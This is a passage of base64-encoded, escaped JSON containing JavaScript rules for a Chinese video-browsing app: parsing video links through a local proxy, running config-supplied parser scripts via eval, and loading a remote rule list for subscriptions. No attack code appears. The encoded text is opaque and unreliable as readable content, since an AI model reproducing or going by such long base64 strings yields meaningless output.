JpcXFxcXFxcIiArIHJ1bGUubmFtZSk7XFxcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgbG9nKFxcXFxcXFwi5bey5a+85YWl6KeE5YiZ77yaXFxcXFxcXCIgKyBydWxlLm5hbWUpXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGlmIChydWxlcy5sZW5ndGggPiAxKSB7XFxcXG4gICAgICAgICAgICAkLnJlcXVpcmUoXFxcXFxcXCJjb25maWdzP3J1bGU9XFxcXFxcXCIgKyBydWxlVGl0bGUpLnNhdmVKc29uKGFycik7XFxcXG4gICAgICAgICAgICB0b2FzdChcXFxcXFxcIuaWsOWinu+8mlxcXFxcXFwiICsgbmV3SSArIFxcXFxcXFwiIOimhuebluabtOaWsO+8mlxcXFxcXFwiICsgKHJ1bGVzLmxlbmd0aCAtIG5ld0kpKTtcXFxcbiAgICAgICAgfVxcXFxuICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgbG9nKGUudG9TdHJpbmcoKSk7XFxcXG4gICAgICAgIHRvYXN0KFxcXFxcXFwi5a+85YWl5aSx6LSlXFxcXFxcXCIpO1xcXFxuICAgIH1cXFxcbn1cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLop4bpopHop6PmnpBcXFwiLFxcXCJwYXRoXFxcIjpcXFwidmlkZW9VcmxcXFwiLFxcXCJydWxlXFxcIjpcXFwiZnVuY3Rpb24gaXNvZmZpY2lhbCh1cmwpIHtcXFxcbiAgbGV0IGZsYWcgPSBuZXcgUmVnRXhwKCdxcVxcXFxcXFxcLmNvbXxpcWl5aVxcXFxcXFxcLmNvbXx5b3VrdVxcXFxcXFxcLmNvbXxtZ3R2XFxcXFxcXFwuY29tfGJpbGliaWxpXFxcXFxcXFwuY29tfHNvaHVcXFxcXFxcXC5jb218aXhpZ3VhXFxcXFxcXFwuY29tfHBwdHZcXFxcXFxcXC5jb218bWlndXZpZGVvXFxcXFxcXFwuY29tfGxlXFxcXFxcXFwuY29tfDE5MDVcXFxcXFxcXC5jb218ZnVuXFxcXFxcXFwudHYnKTtcXFxcbiAgcmV0dXJuIGZsYWcudGVzdCh1cmwpO1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBwcm94eSh0aXRsZSkge1xcXFxuICBmdW5jdGlvbiB0b1BhdGgodmFsdWUpIHtcXFxcbiAgICBpZiAodHlwZW9mIHZhbHVlICE9PSAnc3RyaW5nJykge1xcXFxuICAgICAgcmV0dXJuIFtdO1xcXFxuICAgIH1cXFxcbiAgICBsZXQgcGF0aCA9IFtdO1xcXFxuICAgIGxldCBjdXJyZW50ID0gJyc7XFxcXG4gICAgbGV0IGluQnJhY2tldHMgPSBmYWxzZTtcXFxcbiAgICBsZXQgZXNjYXBlID0gZmFsc2U7XFxcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCB2YWx1ZS5sZW5ndGg7IGkrKykge1xcXFxuICAgICAgbGV0IGNoYXIgPSB2YWx1ZVtpXTtcXFxcbiAgICAgIGlmIChlc2NhcGUpIHtcXFxcbiAgICAgICAgY3VycmVudCArPSBjaGFyO1xcXFxuICAgICAgICBlc2NhcGUgPSBmYWxzZTtcXFxcbiAgICAgIH0gZWxzZSBpZiAoY2hhciA9PT0gJ1xcXFxcXFxcXFxcXFxcXFwnKSB7XFxcXG4gICAgICAgIGVzY2FwZSA9IHRydWU7XFxcXG4gICAgICB9IGVsc2UgaWYgKGNoYXIgPT09ICcuJyAmJiAhaW5CcmFja2V0cykge1xcXFxuICAgICAgICBwYXRoLnB1c2goY3VycmVudCk7XFxcXG4gICAgICAgIGN1cnJlbnQgPSAnJztcXFxcbiAgICAgIH0gZWxzZSBpZiAoY2hhciA9PT0gJ1snKSB7XFxcXG4gICAgICAgIGluQnJhY2tldHMgPSB0cnVlO1xcXFxuICAgICAgfSBlbHNlIGlmIChjaGFyID09PSAnXScpIHtcXFxcbiAgICAgICAgaW5CcmFja2V0cyA9IGZhbHNlO1xcXFxuICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgY3VycmVudCArPSBjaGFyO1xcXFxuICAgICAgfVxcXFxuICAgIH1cXFxcbiAgICBpZiAoY3VycmVudCkge1xcXFxuICAgICAgcGF0aC5wdXNoKGN1cnJlbnQpO1xcXFxuICAgIH1cXFxcbiAgICByZXR1cm4gcGF0aDtcXFxcbiAgfVxcXFxuXFxcXG4gIGZ1bmN0aW9uIGdldEpzb24ob2JqLCBwYXRoKSB7XFxcXG4gICAgaWYgKCFvYmogfHwgIUFycmF5LmlzQXJyYXkocGF0aCkpIHtcXFxcbiAgICAgIHJldHVybiB1bmRlZmluZWQ7XFxcXG4gICAgfVxcXFxuICAgIGlmIChwYXRoLmxlbmd0aCA9PT0gMCkge1xcXFxuICAgICAgcmV0dXJuIG9iajtcXFxcbiAgICB9XFxcXG4gICAgbGV0IGN1cnJlbnQgPSBvYmo7XFxcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBwYXRoLmxlbmd0aDsgaSsrKSB7XFxcXG4gICAgICBsZXQga2V5ID0gcGF0aFtpXTtcXFxcbiAgICAgIGlmIChjdXJyZW50ID09PSBudWxsIHx8IGN1cnJlbnQgPT09IHVuZGVmaW5lZCB8fCB0eXBlb2YgY3VycmVudCAhPT0gJ29iamVjdCcpIHtcXFxcbiAgICAgICAgcmV0dXJuIHVuZGVmaW5lZDtcXFxcbiAgICAgIH1cXFxcbiAgICAgIGN1cnJlbnQgPSBjdXJyZW50W2tleV07XFxcXG4gICAgfVxcXFxuICAgIHJldHVybiBjdXJyZW50O1xcXFxuICB9XFxcXG4gIHRyeSB7XFxcXG4gICAgbGV0IHJ1blR5cGUgPSBNWV9QQVJBTVMucnVuVHlwZVswXTtcXFxcbiAgICBsZXQgdXJsID0gZGVjb2RlVVJJQ29tcG9uZW50KGJhc2U2NERlY29kZShNWV9QQVJBTVMudXJsWzBdKSk7XFxcXG4gICAgaWYgKHJ1blR5cGUgPT0gXFxcXFxcXCJKU09OXFxcXFxcXCIpIHtcXFxcblxcXFxuICAgICAgbGV0IHBhcmFtID0gSlNPTi5wYXJzZShkZWNvZGVVUklDb21wb25lbnQoYmFzZTY0RGVjb2RlKE1ZX1BBUkFNUy5wYXJhbVswXSkpKTtcXFxcbiAgICAgIGxldCBqc29uID0gSlNPTi5wYXJzZShyZXF1ZXN0KHVybCwge1xcXFxuICAgICAgICBoZWFkZXJzOiBwYXJhbS5oZWFkZXJzIHx8IHt9LFxcXFxuICAgICAgICBtZXRob2Q6IHBhcmFtLm1ldGhvZCB8fCB2b2lkIDBcXFxcbiAgICAgIH0pKTtcXFxcbiAgICAgIHJldHVybiBKU09OLnN0cmluZ2lmeSh7XFxcXG4gICAgICAgIHN0YXR1c0NvZGU6IDMwMixcXFxcbiAgICAgICAgaGVhZGVyczogT2JqZWN0LmFzc2lnbih7fSwgcGFyYW0uaGVhZGVycyB8fCB7fSwge1xcXFxuICAgICAgICAgIFxcXFxcXFwiTG9jYXRpb25cXFxcXFxcIjogZ2V0SnNvbihqc29uLCB0b1BhdGgocGFyYW0uanNvblBhdGgpKSxcXFxcbiAgICAgICAgfSlcXFxcbiAgICAgIH0pO1xcXFxuICAgIH0gZWxzZSBpZiAocnVuVHlwZSA9PSBcXFxcXFxcIkpTXFxcXFxcXCIpIHtcXFxcblxcXFxuICAgICAgbGV0IHBhcnNlO1xcXFxuICAgICAgaWYgKE1ZX1BBUkFNUy5pbmRleCkge1xcXFxuICAgICAgICBwYXJzZSA9ICQucmVxdWlyZShcXFxcXFxcImNvbmZpZ3M/cnVsZT1cXFxcXFxcIiArIHRpdGxlKS5nZXRKc29uKClbTVlfUEFSQU1TLmluZGV4WzBdXTtcXFxcbiAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgIHBhcnNlID0gSlNPTi5wYXJzZShkZWNvZGVVUklDb21wb25lbnQoYmFzZTY0RGVjb2RlKE1ZX1BBUkFNUy5wYXJhbVswXSkpKTtcXFxcbiAgICAgIH1cXFxcbiAgICAgIGxldCByZXMgPSBuZXcgRnVuY3Rpb24oXFxcXFxcXCJ1cmxcXFxcXFxcIiwgXFxcXFxcXCJzZWxmXFxcXFxcXCIsIHBhcnNlLmpzKSh1cmwsIHBhcnNlKTtcXFxcbiAgICAgIGlmICh0eXBlb2YgcmVzID09PSBcXFxcXFxcInN0cmluZ1xcXFxcXFwiKSB7XFxcXG4gICAgICAgIHJldHVybiBKU09OLnN0cmluZ2lmeSh7XFxcXG4gICAgICAgICAgc3RhdHVzQ29kZTogMzAyLFxcXFxuICAgICAgICAgIGhlYWRlcnM6IHtcXFxcbiAgICAgICAgICAgIFxcXFxcXFwiTG9jYXRpb25cXFxcXFxcIjogcmVzXFxcXG4gICAgICAgICAgfVxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgIH0gZWxzZSBpZiAoJC50eXBlKHJlcykgPT09IFxcXFxcXFwib2JqZWN0XFxcXFxcXCIpIHtcXFxcbiAgICAgICAgcmV0dXJuIEpTT04uc3RyaW5naWZ5KHtcXFxcbiAgICAgICAgICBzdGF0dXNDb2RlOiAzMDIsXFxcXG4gICAgICAgICAgaGVhZGVyczogcmVzXFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgfVxcXFxuICAgIH1cXFxcbiAgfSBjYXRjaCAoZSkge1xcXFxuICAgIGxvZyhlLnRvU3RyaW5nKCkpO1xcXFxuICB9XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIHByZXBhcmVQYXJzZXMocGFyc2VzLCB1cmwsIHBsYXlsaXN0LCBpc1Rlc3QpIHtcXFxcbiAgcGxheWxpc3QgPSBwbGF5bGlzdCB8fCB7XFxcXG4gICAgdXJsczogW10sXFxcXG4gICAgbmFtZXM6IFtdLFxcXFxuICAgIGhlYWRlcnM6IFtdLFxcXFxuICAgIGlzOiBcXFxcXFxcIiNpc1ZpZGVvPXRydWUjXFxcXFxcXCIsXFxcXG4gIH07XFxcXG4gIGxldCBwcm94eVVybCA9IHN0YXJ0UHJveHlTZXJ2ZXIoJC50b1N0cmluZyhwcm94eSwgTVlfUlVMRS50aXRsZSkpO1xcXFxuICBwYXJzZXMuZm9yRWFjaCgodiwgaSkgPT4ge1xcXFxuICAgIGlmICh2LmZvcmJpZGRlbikgcmV0dXJuO1xcXFxuICAgIHBsYXlsaXN0Lm5hbWVzLnB1c2godi5uYW1lKTtcXFxcbiAgICBpZiAodi5oZWFkZXJzKSB7XFxcXG4gICAgICBwbGF5bGlzdC5oZWFkZXJzLnB1c2godi5oZWFkZXJzKTtcXFxcbiAgICB9XFxcXG4gICAgaWYgKHYucnVuVHlwZSA9PT0gXFxcXFxcXCJKU09OXFxcXFxcXCIpIHtcXFxcbiAgICAgIGxldCBwYXJhbSA9IHtcXFxcbiAgICAgICAgLy91cmw6IHYudXJsLFxcXFxuICAgICAgICBtZXRob2Q6IHYubWV0aG9kLFxcXFxuICAgICAgICBoZWFkZXJzOiB2LmhlYWRlcnMsXFxcXG4gICAgICAgIGpzb25QYXRoOiB2Lmpzb25QYXRoXFxcXG4gICAgICB9O1xcXFxuICAgICAgcGxheWxpc3QudXJscy5wdXNoKHByb3h5VXJsICsgXFxcXFxcXCI/cnVuVHlwZT1KU09OJnVybD1cXFxcXFxcIiArIGVuY29kZVVSSUNvbXBvbmVudChiYXNlNjRFbmNvZGUodi51cmwgKyB1cmwpKSArIFxcXFxcXFwiJnBhcmFtPVxcXFxcXFwiICsgZW5jb2RlVVJJQ29tcG9uZW50KGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShwYXJhbSkpKSk7XFxcXG4gICAgfSBlbHNlIGlmICh2LnJ1blR5cGUgPT09IFxcXFxcXFwiSlNcXFxcXFxcIikge1xcXFxuICAgICAgcGxheWxpc3QudXJscy5wdXNoKHByb3h5VXJsICsgXFxcXFxcXCI/cnVuVHlwZT1KUyZ1cmw9XFxcXFxcXCIgKyBlbmNvZGVVUklDb21wb25lbnQoYmFzZTY0RW5jb2RlKHVybCkpICsgKGlzVGVzdCA/IFxcXFxcXFwiJnBhcmFtPVxcXFxcXFwiICsgZW5jb2RlVVJJQ29tcG9uZW50KGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeSh2KSkpIDogXFxcXFxcXCImaW5kZXg9XFxcXFxcXCIgKyBpKSk7XFxcXG4gICAgfSBlbHNlIHtcXFxcbiAgICAgIHBsYXlsaXN0LnVybHMucHVzaChcXFxcXFxcInZpZGVvOi8vXFxcXFxcXCIgKyB2LnVybCArIHVybCk7XFxcXG4gICAgfVxcXFxuICB9KTtcXFxcbiAgcmV0dXJuIEpTT04uc3RyaW5naWZ5KHBsYXlsaXN0KTtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gdXNlUGFyc2VzKHVybCkge1xcXFxuICBsZXQgcGFyc2VzID0gJC5yZXF1aXJlKFxcXFxcXFwiY29uZmlnc1xcXFxcXFwiKS5nZXRKc29uKCk7XFxcXG4gIGlmICghcGFyc2VzLmxlbmd0aCkgcmV0dXJuIFxcXFxcXFwid2ViOi8vXFxcXFxcXCIgKyB1cmw7XFxcXG4gIGxldCBwbGF5bGlzdCA9IHtcXFxcbiAgICB1cmxzOiBbXSxcXFxcbiAgICBuYW1lczogW10sXFxcXG4gICAgaGVhZGVyczogW10sXFxcXG4gICAgaXM6IFxcXFxcXFwiI2lzVmlkZW89dHJ1ZSNcXFxcXFxcIixcXFxcbiAgfTtcXFxcbiAgdHJ5IHtcXFxcbiAgICBsZXQgdXNlRGFubXUgPSAhIWdldEl0ZW0oXFxcXFxcXCJ1c2VEYW5tdVxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICBpZiAodXNlRGFubXUpIHtcXFxcbiAgICAgIHBsYXlsaXN0LmRhbm11ID0gJC5yZXF1aXJlKCdkbUZ1bj9ydWxlPWRt55uS5a2QJykuZG1Sb3V0ZSh1cmwpO1xcXFxuICAgIH1cXFxcbiAgfSBjYXRjaCB7IH1cXFxcbiAgcmV0dXJuIHByZXBhcmVQYXJzZXMocGFyc2VzLCB1cmwsIHBsYXlsaXN0KTtcXFxcbn1cXFxcbiQuZXhwb3J0cy5wYXJzZSA9IGZ1bmN0aW9uIChpbnB1dCwgaWQsIHNvdXJjZSkge1xcXFxuICBsZXQgZHJweSA9IEdNLmRlZmluZU1vZHVsZShcXFxcXFxcIkRycHlNYW5hZ2VcXFxcXFxcIikuZ2V0QnlTb3VyY2Uoc291cmNlKTtcXFxcbiAgaW5wdXQgPSBpbnB1dC5zcGxpdChcXFxcXFxcIiNcXFxcXFxcIik7XFxcXG4gIGxldCBwbGF5ID0gSlNPTi5wYXJzZShkcnB5LnBsYXkoaW5wdXRbMV0sIGlucHV0WzBdLnJlcGxhY2UoXFxcXFxcXCJ0dmJveC14ZzpcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIiksIFtdKSk7XFxcXG4gIC8vIGxvZyhwbGF5KVxcXFxuICAvLyBsb2coaWQpXFxcXG4gIC8vbG9nKHBsYXkpXFxcXG4gIGZ1bmN0aW9uIHBhcnNlUXVlcnkocXVlcnkpIHtcXFxcbiAgICB2YXIgb2JqID0ge307XFxcXG4gICAgcXVlcnkuc3BsaXQoXFxcXFxcXCImXFxcXFxcXCIpLmZpbHRlcihlID0+IGUpLmZvckVhY2goZnVuY3Rpb24gKGl0ZW0pIHtcXFxcbiAgICAgIHZhciBwYXJ0cyA9IGl0ZW0uc3BsaXQoXFxcXFxcXCI9XFxcXFxcXCIpO1xcXFxuICAgICAgb2JqW3BhcnRzWzBdXSA9IHBhcnRzWzFdO1xcXFxuICAgIH0pO1xcXFxuICAgIHJldHVybiBvYmo7XFxcXG4gIH1cXFxcbiAgdmFyIGV4dHJhID0ge1xcXFxuICAgIFxcXFxcXFwidWFcXFxcXFxcIjogTU9CSUxFX1VBXFxcXG4gIH1cXFxcbiAgbGV0IHBhcnNlID0gcGxheTtcXFxcbiAgbGV0IHBhcnNlX29iaiA9IHtcXFxcbiAgICBkZWZSdWxlczogW1xcXFxcXFwiKi5tcDRcXFxcXFxcIiwgXFxcXFxcXCIqLm0zdThcXFxcXFxcIl0sXFxcXG4gIH07XFxcXG4gIGlmIChwYXJzZS5oYXNPd25Qcm9wZXJ0eShcXFxcXFxcInBhcnNlX2V4dHJhXFxcXFxcXCIpKSB7XFxcXG4gICAgbGV0IHBhcnNlX2V4dHJhID0gZGVjb2RlVVJJQ29tcG9uZW50KHBhcnNlLnBhcnNlX2V4dHJhKTtcXFxcbiAgICBwYXJzZV9vYmogPSBPYmplY3QuYXNzaWduKHBhcnNlX29iaiwgcGFyc2VRdWVyeShwYXJzZV9leHRyYSkpO1xcXFxuICAgIGlmIChwYXJzZV9vYmouaGFzT3duUHJvcGVydHkoXFxcXFxcXCJpbml0X3NjcmlwdFxcXFxcXFwiKSkge1xcXFxuICAgICAgcGFyc2Vfb2JqW1xcXFxcXFwiaW5pdF9zY3JpcHRcXFxcXFxcIl0gPSBiYXNlNjREZWNvZGUocGFyc2Vfb2JqW1xcXFxcXFwiaW5pdF9zY3JpcHRcXFxcXFxcIl0pO1xcXFxuICAgIH1cXFxcbiAgfVxcXFxuICBpZiAocGFyc2Vfb2JqLmhhc093blByb3BlcnR5KFxcXFxcXFwiaXNfcGNcXFxcXFxcIikgJiYgcGFyc2Vfb2JqW1xcXFxcXFwiaXNfcGNcXFxcXFxcIl0gPT0gXFxcXFxcXCIxXFxcXFxcXCIpIHtcXFxcbiAgICBleHRyYVtcXFxcXFxcInVhXFxcXFxcXCJdID0gUENfVUE7XFxcXG4gIH1cXFxcbiAgaWYgKHBhcnNlLmhhc093blByb3BlcnR5KFxcXFxcXFwiaGVhZGVyXFxcXFxcXCIpKSB7XFxcXG4gICAgZXh0cmFbXFxcXFxcXCJ1YVxcXFxcXFwiXSA9IHBhcnNlW1xcXFxcXFwiaGVhZGVyXFxcXFxcXCJdW1xcXFxcXFwiVXNlci1BZ2VudFxcXFxcXFwiXTtcXFxcbiAgICAvL2V4dHJhW1xcXFxcXFwicmVkaXJlY3RcXFxcXFxcIl09ZmFsc2U7XFxcXG4gICAgLypleHRyYVtcXFxcXFxcImpzXFxcXFxcXCJdID0gJC50b1N0cmluZygoanMpID0+IHtcXFxcbiAgICAgIGV2YWwoanMpXFxcXG4gICAgICBmYmEubG9nKG5hdmlnYXRvci51c2VyQWdlbnQpXFxcXG4gICAgICBmYmEubG9nKGxvY2F0aW9uLmhyZWYpXFxcXG4gICAgfSwgJC50b1N0cmluZygoKSA9PiB7XFxcXG4gICAgICBPYmplY3QuZGVmaW5lUHJvcGVydHkobmF2aWdhdG9yLCAndXNlckFnZW50Jywge1xcXFxuICAgICAgICBnZXQ6IGZ1bmN0aW9uICgpIHtcXFxcbiAgICAgICAgICByZXR1cm4gJ015LUN1c3RvbS1VQS1TdHJpbmcnO1xcXFxuICAgICAgICB9XFxcXG4gICAgICB9KTtcXFxcbiAgICB9KSkqL1xcXFxuICB9XFxcXG4gIGlmIChwYXJzZV9vYmouaGFzT3duUHJvcGVydHkoXFxcXFxcXCJjdXN0b21fcmVnZXhcXFxcXFxcIikpIHtcXFxcbiAgICBsZXQgY3VycmVudCA9IHBhcnNlX29ialtcXFxcXFxcImRlZlJ1bGVzXFxcXFxcXCJdO1xcXFxuICAgIGV4dHJhW1xcXFxcXFwidmlkZW9SdWxlc1xcXFxcXFwiXSA9IGN1cnJlbnQuY29uY2F0KHBhcnNlX29iai5jdXN0b21fcmVnZXguc3BsaXQoL1xcXFxcXFxcfC9nKS5maWx0ZXIoZSA9PiBlKSlcXFxcbiAgfVxcXFxuICBpZiAocGFyc2UuaGFzT3duUHJvcGVydHkoXFxcXFxcXCJqc1xcXFxcXFwiKSAmJiBwYXJzZS5qcyAhPSBcXFxcXFxcIlxcXFxcXFwiKSB7XFxcXG4gICAgZXh0cmFbXFxcXFxcXCJqc1xcXFxcXFwiXSA9ICQudG9TdHJpbmcoKGpzLCBwYXJzZSwgdCkgPT4ge1xcXFxuICAgICAgaWYgKHBhcnNlLmhhc093blByb3BlcnR5KFxcXFxcXFwiaW5pdF9zY3JpcHRcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgZmJhLmxvZyh0ICsgXFxcXFxcXCI65omn6KGMaW5pdF9zY3JpcHRcXFxcXFxcIik7XFxcXG4gICAgICAgIGV2YWwocGFyc2UuaW5pdF9zY3JpcHQpO1xcXFxuICAgICAgfVxcXFxuICAgICAgZmJhLmxvZyhuYXZpZ2F0b3IucGxhdGZvcm0pO1xcXFxuICAgICAgZmJhLmxvZyh0ICsgXFxcXFxcXCI65omn6KGManPngrnlh7tcXFxcXFxcIilcXFxcbiAgICAgIGV2YWwoanMpXFxcXG4gICAgfSwgcGFyc2UuanMsIHBhcnNlX29iaiwgTVlfUlVMRS50aXRsZSlcXFxcbiAgfVxcXFxuICBsZXQgaXRlbSA9IGZpbmRJdGVtKGlkKTtcXFxcbiAgdXBkYXRlSXRlbShpZCwge1xcXFxuICAgIGV4dHJhOiBPYmplY3QuYXNzaWduKHt9LCBpdGVtLmV4dHJhLCBleHRyYSlcXFxcbiAgfSlcXFxcblxcXFxuICBpZiAocGxheS51cmwuaW5jbHVkZXMoXFxcXFxcXCJwcm94eT9kb1xcXFxcXFwiKSkge1xcXFxuICAgIE1ZX1VSTCA9IHBsYXkudXJsO1xcXFxuICAgIHBsYXkudXJsID0gZGVjb2RlVVJJQ29tcG9uZW50KGdldFBhcmFtKFxcXFxcXFwidXJsXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpKTtcXFxcbiAgfVxcXFxuICBpZiAocGxheS51cmwuc3RhcnRzV2l0aChcXFxcXFxcInB1c2g6Ly9cXFxcXFxcIikpIHtcXFxcbiAgICBwbGF5LnVybCA9IHBsYXkudXJsLnJlcGxhY2UoXFxcXFxcXCJwdXNoOi8vXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuICB9XFxcXG4gIGlmIChwbGF5LnVybC5zdGFydHNXaXRoKFxcXFxcXFwiaHR0cHM6Ly9wYW4ucXVhcmsuY24vXFxcXFxcXCIpKSB7XFxcXG4gICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3F1YXJrTGlzdD9ydWxlPVF1YXJrLueugCZyZWFsdXJsPVxcXFxcXFwiICsgZW5jb2RlVVJJQ29tcG9uZW50KHBsYXkudXJsKSArIFxcXFxcXFwiJnNoYXJlUHdkPVxcXFxcXFwiO1xcXFxuICB9XFxcXG4gIGlmIChwbGF5LnVybC5zdGFydHNXaXRoKCdodHRwczovL3d3dy5hbGl5dW5kcml2ZS5jb20vcy8nKSB8fCBwbGF5LnVybC5zdGFydHNXaXRoKFxcXFxcXFwiaHR0cHM6Ly93d3cuYWxpcGFuLmNvbS9zL1xcXFxcXFwiKSkge1xcXFxuICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vcGFnZS9hbGl5dW4/cnVsZT3kupHnm5jlkJsu566AJnBhZ2U9ZnlwYWdlJnJlYWx1cmw9XFxcXFxcXCIgKyBlbmNvZGVVUklDb21wb25lbnQocGxheS51cmwpO1xcXFxuICB9XFxcXG4gIGlmIChwbGF5LnBhcnNlID09PSAxKSB7XFxcXG4gICAgaWYgKHBsYXkudXJsLnN0YXJ0c1dpdGgoXFxcXFxcXCJtYWduZXQ6XFxcXFxcXCIpKSB7XFxcXG4gICAgICByZXR1cm4gcGxheS51cmw7XFxcXG4gICAgfVxcXFxuICAgIGlmIChpc29mZmljaWFsKHBsYXkudXJsKSAmJiAocGxheS5mbGFnIHx8IGlucHV0WzFdKSkge1xcXFxuICAgICAgcmV0dXJuIHVzZVBhcnNlcyhwbGF5LnVybCk7XFxcXG4gICAgfVxcXFxuICAgIHJldHVybiBcXFxcXFxcInZpZGVvOi8vXFxcXFxcXCIgKyBwbGF5LnVybDtcXFxcbiAgfSBlbHNlIGlmIChwbGF5LnBhcnNlID09PSAwKSB7XFxcXG4gICAgaWYgKHBsYXkudXJsLnN0YXJ0c1dpdGgoXFxcXFxcXCJtYWduZXQ6XFxcXFxcXCIpKSB7XFxcXG4gICAgICByZXR1cm4gcGxheS51cmw7XFxcXG4gICAgfVxcXFxuICAgIC8vbG9nKHBsYXkpXFxcXG4gICAgdmFyIHBsYXlvYmogPSB7fTtcXFxcbiAgICBwbGF5b2JqLnVybHMgPSBbcGxheS51cmwgKyBcXFxcXFxcIiNpc1ZpZGVvPXRydWUjXFxcXFxcXCJdO1xcXFxuICAgIGlmIChwbGF5Lmhhc093blByb3BlcnR5KFxcXFxcXFwiaGVhZGVyXFxcXFxcXCIpKSB7XFxcXG4gICAgICBwbGF5b2JqW1xcXFxcXFwiaGVhZGVyc1xcXFxcXFwiXSA9IHBsYXkuaGVhZGVyO1xcXFxuICAgIH1cXFxcbiAgICBpZiAocGxheS5oYXNPd25Qcm9wZXJ0eShcXFxcXFxcImRhbm1ha3VcXFxcXFxcIikpIHtcXFxcbiAgICAgIHBsYXlvYmpbXFxcXFxcXCJkYW5tdVxcXFxcXFwiXSA9IHBsYXkuZGFubWFrdTtcXFxcbiAgICB9XFxcXG4gICAgcmV0dXJuIEpTT04uc3RyaW5naWZ5KHBsYXlvYmopO1xcXFxuICB9XFxcXG59XFxcXG4kLmV4cG9ydHMucHJlcGFyZVBhcnNlcyA9IHByZXBhcmVQYXJzZXM7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5Yib5bu66K6i6ZiFXFxcIixcXFwicGF0aFxcXCI6XFxcImNyZWF0ZVN1YnNjcmlwdGlvblxcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbmxldCBsYXlvdXQgPSBbXTtcXFxcbmxldCBmID0gJC5yZXF1aXJlKFxcXFxcXFwiaHR0cDovL2hpa2VyLm5va2lhLnByZXNzL2hpa2VydWxlL3J1bGVsaXN0Lmpzb24/aWQ9NTA5OVxcXFxcXFwiKTtcXFxcbmFkZExpc3RlbmVyKFxcXFxcXFwib25DbG9zZVxcXFxcXFwiLCAoKSA9PiB7XFxcXG4gICAgY2xlYXJNeVZhcihcXFxcXFxcImRycHlIaWtlcl9zdWJfaW5wdXRcXFxcXFxcIik7XFxcXG4gICAgY2xlYXJNeVZhcihcXFxcXFxcImRycHlIaWtlcl9zdWJ1cmxfaW5wdXRcXFxcXFxcIik7XFxcXG4gICAgY2xlYXJNeVZhcihcXFxcXFxcImRycHlIaWtlcl9zdWJuYW1lX2lucHV0XFxcXFxcXCIpO1xcXFxufSk7XFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwiaW5wdXRcXFxcXFxcIixcXFxcbiAgICBkZXNjOiBcXFxcXFxcIuiuoumYheWQjeensFxcXFxcXFwiLFxcXFxuICAgIGV4dHJhOiB7XFxcXG4gICAgICAgIHRpdGxlVmlzaWJsZTogZmFsc2UsXFxcXG4gICAgICAgIGRlZmF1bHRWYWx1ZTogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICAgICAgb25DaGFuZ2U6ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJkcnB5SGlrZXJfc3VibmFtZV9pbnB1dFxcXFxcXFwiLCBpbnB1dCk7XFxcXG4gICAgICAgIH0pLFxcXFxuICAgICAgICBpZDogXFxcXFxcXCJkcnB5SGlrZXJfc3VibmFtZV9pbnB1dFxcXFxcXFwiXFxcXG4gICAgfVxcXFxufSk7XFxcXG5sZXQgcGF0aCA9IGpvaW5VcmwoZ2V0UGF0aChcXFxcXFxcImhpa2VyOi8vZmlsZXMvXFxcXFxcXCIpLCBcXFxcXFxcIi4uL1xcXFxcXFwiLnJlcGVhdCg1KSkuc2xpY2UoNyk7XFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwi6YCJ5oupXFxcXFxcXCIsXFxcXG4gICAgdXJsOiBKU09OLnN0cmluZ2lmeShmLmZpbGVTZWxlY3Rpb25Vcmkoe1xcXFxuICAgICAgICBjYWxsYmFjazogJC50b1N0cmluZygoKSA9PiB7XFxcXG4gICAgICAgICAgICBsZXQgdGFyZ2V0ID0gZmluZEl0ZW0oXFxcXFxcXCJkcnB5SGlrZXJfc3ViX2lucHV0XFxcXFxcXCIpLmV4dHJhO1xcXFxuICAgICAgICAgICAgdXBkYXRlSXRlbShcXFxcXFxcImRycHlIaWtlcl9zdWJfaW5wdXRcXFxcXFxcIiwge1xcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiBPYmplY3QuYXNzaWduKHRhcmdldCwge1xcXFxuICAgICAgICAgICAgICAgICAgICBkZWZhdWx0VmFsdWU6IFBBVEhcXFxcbiAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICByZXR1cm4gdHJ1ZTtcXFxcbiAgICAgICAgfSksXFxcXG4gICAgICAgIHJvb3REaXJQYXRoOiBwYXRoLFxcXFxuICAgICAgICBpbml0aWFsUGF0aDogcGF0aCxcXFxcbiAgICAgICAgcGF0dGVybjogMVxcXFxuICAgIH0pKSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJpbnB1dFxcXFxcXFwiLFxcXFxuICAgIGRlc2M6IFxcXFxcXFwi5YKo5a2